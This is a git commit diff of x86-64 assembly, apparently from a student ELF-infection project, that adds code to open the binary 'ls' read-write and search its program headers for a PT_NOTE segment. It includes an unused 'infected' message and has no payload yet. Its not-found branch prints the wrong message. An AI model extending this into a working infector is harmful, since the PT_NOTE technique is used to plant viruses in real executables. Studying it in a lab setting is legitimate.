a65d20478ee38c99d41c3a7c29760aebc1ecb1ed
Nino Hamel <nino.hamel@yahoo.fr>
2024-11-09 18:57:25 +0100

    find pt_note

--- projet_elf.s
+++ projet_elf.s
@@ -3,7 +3,7 @@
 
 ; section pour les constantes
 section .data
-    filename db 'new_elf', 0  ; Nom du fichier
+    filename db 'ls', 0
     Elf_header_struct_size equ 64
 
     not_elf db 'The binary is not an ELF file', 0xA, 0  ; Erreur type elf
@@ -14,7 +14,12 @@ section .data
     is_directory_len equ $ - is_directory
     is_not_directory db 'The file is not a directory', 0xA, 0  ; Success type fichier (n'est pas un dossier)
     is_not_directory_len equ $ - is_not_directory
-
+    if_pt_note_string db 'Found PT_Note', 0xA, 0  ; Success type fichier (n'est pas un dossier)
+    if_pt_note_string_len equ $ - if_pt_note_string
+    if_not_pt_note_string db 'Couldn t find PT_Note', 0xA, 0  ; Success type fichier (n'est pas un dossier)
+    if_not_pt_note_string_len equ $ - if_not_pt_note_string  
+    success_msg db 'Successfully infected the file', 0xA, 0
+    success_msg_len equ $ - success_msg
     error_open db 'Error opening file', 0xA, 0   ; Message d'erreur lors de l'ouverture
     error_open_len equ $ - error_open  ; Longueur de la chaine
     error_stat db 'Error when calling stat', 0xA, 0   ; Message d'erreur lors de l'appel de stat
@@ -37,44 +42,43 @@ section .data
         .e_shentsize: resb 2
         .e_shnum: resb 2
         .e_shstrndx: resb 2
-    endstruc
+    endstruc    
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ; section pour les variables
 section .bss
     stat_buffer resb 144 ; 144 = buffer typique pour stat en x86_64
-    elf_header resb Elf_header_struct_size ; instance de elf_header_struct (à remplir avec les infos du header elf)
+    elf_header resb 64 ; instance de elf_header_struct (à remplir avec les infos du header elf)
+    program_header resb 56 ; instance de Elf64_Phdr (à remplir avec les infos du header de programme)
+    fd resq 1 ; Pour sauvegarder le descripteur de fichier
+    last_load_end resq 1 ; Pour sauvegarder la fin du dernier segment LOAD
+    phdr_offset resq 1 ; Offset des program headers
+    temp_buffer resb 56 ; Buffer temporaire pour lire les program headers
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
-; section pour le code
 section .text
 global _start
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
-; Main
 _start:
     call cmp_stat_directory
     call open_file
     call read_file
-    ;call print_buffer
     call cmp_header_elf
+    call find_pt_note
     jmp exit_program 
 
 ; Ouvrir le fichier
 open_file:
     mov rax, 2                    ; numéro de syscall pour open
     mov rdi, filename             ; pointeur vers le nom du fichier
-    mov rsi, 0                    ; flags : mode lecture seule
-    xor rdx, rdx                  ; mode : non utilisé pour la lecture seule
-    syscall                      
+    mov rsi, 2                    ; flags : read write
+    xor rdx, rdx                ; mode : non utilisé ici
+    syscall     
 
     ; Vérifie si le fichier a été ouvert avec succès
     cmp rax, 0
     jl open_error                 ; Si la valeur de retour < 0, c'est une erreur
-    mov rdi, rax                  ; Sauvegarde le descripteur de fichier dans rdi
+    mov [fd], rax ; Sauvegarde le descripteur de fichier
     ret
 
     ; Afficher le message d'erreur si on a pas pu ouvrir le fichier
@@ -84,49 +88,38 @@ open_file:
         mov rsi, error_open       ; pointeur vers le message d'erreur
         mov rdx, error_open_len            ; longueur du message d'erreur
         syscall
-        jmp exit_program                         
+        jmp exit_program
 
 ; Lire les premiers octets du fichier
 read_file:
-    ; rdi = fd (filename)
     mov rax, 0                    ; syscall pour lire
-    mov rsi, elf_header               ; buffer pour stocker les octets
-    mov rdx, Elf_header_struct_size                 ; nombre d'octets à lire
-    syscall                    
+    mov rdi, [fd]
+    mov rsi, elf_header         ; structure pour le header elf
+    mov rdx, Elf_header_struct_size         ; nombre d'octets à lire
+    syscall
     ret
 
-    ; Afficher le buffer
-    print_buffer:
-        mov rax, 1 ; syscall pour écrire
-        mov rdi, 1 ; descripteur de fichier : stdout
-        mov rsi, elf_header ; rsi = buffer (la valeur à écrire)
-        mov rdx, 512; rdx = 4 (la taille du buffer)
-        syscall
-        ret
-
-; Regarder si le fichier est un elf (4 premiers bytes = .ELF)
 cmp_header_elf:
-
     mov eax, dword [elf_header] ; début de la structure = .ELF
-    cmp eax,  0x464c457f ;.ELF en hexa (little endian)
-    je print_success_equal ; si égal
+    cmp eax, 0x464c457f    ;.ELF en hexa (little endian)
+    je is_elf_file ; si égal
 
     ;sinon
-    print_not_equal:
-    mov rax, 1 ; syscall pour écrire
-    mov rdi, 1 ; descripteur de fichier : stdout
-    mov rsi, not_elf; rsi = buffer (la valeur à écrire)
-    mov rdx, not_elf_len ;(la taille du buffer)
-    syscall
-    jmp exit_program
+    print_not_elf:
+        mov rax, 1 ; syscall pour écrire
+        mov rdi, 1 ; descripteur de fichier : stdout
+        mov rsi, not_elf; rsi = buffer (la valeur à écrire)
+        mov rdx, not_elf_len ;(la taille du buffer)
+        syscall
+        jmp exit_program
 
-print_success_equal:
-    mov rax, 1 ; syscall pour écrire
-    mov rdi, 1 ; descripteur de fichier : stdout
-    mov rsi, is_elf; rsi = buffer (la valeur à écrire)
-    mov rdx, is_elf_len ; (la taille du buffer)
-    syscall
-    ret
+    is_elf_file:
+        mov rax, 1 ; syscall pour écrire
+        mov rdi, 1 ; descripteur de fichier : stdout
+        mov rsi, is_elf; rsi = buffer (la valeur à écrire)
+        mov rdx, is_elf_len ; (la taille du buffer)
+        syscall
+        ret
 
 cmp_stat_directory:
     mov rax, 4 ; syscall pour stat
@@ -168,10 +161,63 @@ cmp_stat_directory:
         syscall  
         jmp exit_program
 
+find_pt_note:
+    ; Obtenir l'offset des program headers
+    mov rax, [elf_header + Elf_header_struct.e_phoff]
+    mov [phdr_offset], rax
+
+    movzx rcx, word [elf_header + Elf_header_struct.e_phnum]    ; rcx = nombre de program headers
+
+    ; boucle pour trouver pt_note
+    ; on regarde dans chaque program header
+    search_pt_note:
+        push rcx ; Sauvegarder le compteur
+        
+        ; Lire le program header
+        mov rax, 8          ; lseek
+        mov rdi, [fd]
+        mov rsi, [phdr_offset]
+        xor rdx, rdx        ; SEEK_SET
+        syscall
+
+        mov rax, 0          ; read
+        mov rdi, [fd]
+        mov rsi, program_header
+        movzx rdx, word [elf_header + Elf_header_struct.e_phentsize]   ; Elf64_Phdr = 56 
+        syscall
+
+        ; Vérifier si c'est PT_NOTE
+        cmp dword [program_header], 4    ; 4 =  PT_NOTE
+        je if_pt_note
+
+        ; Passer au header suivant
+        add qword [phdr_offset], 56
+        ; mettre à jour le compteur
+        pop rcx 
+        dec rcx 
+        jnz search_pt_note ; loop
+
+        if_not_pt_note:
+            mov rax, 1
+            mov rdi, 1
+            mov rsi, if_pt_note_string
+            mov rdx, if_pt_note_string_len
+            syscall
+            jmp exit_program
+
+        if_pt_note:
+            mov rax, 1 ; syscall pour écrire
+            mov rdi, 1 ; descripteur de fichier : stdout
+            mov rsi, if_pt_note_string; rsi = la valeur à écrire
+            mov rdx, if_pt_note_string_len ; la taille du buffer
+            syscall
+            pop rcx  ; Restaurer la pile
+            ret
 
 ; Terminer le programme
 exit_program:
     ; Fermer le fichier
+    mov rdi, [fd]
     mov rax, 3 ; syscall pour fermer
     syscall
 
@@ -180,3 +226,4 @@ exit_program:
     xor rdi, rdi                  ; statut : 0
     syscall
     
+
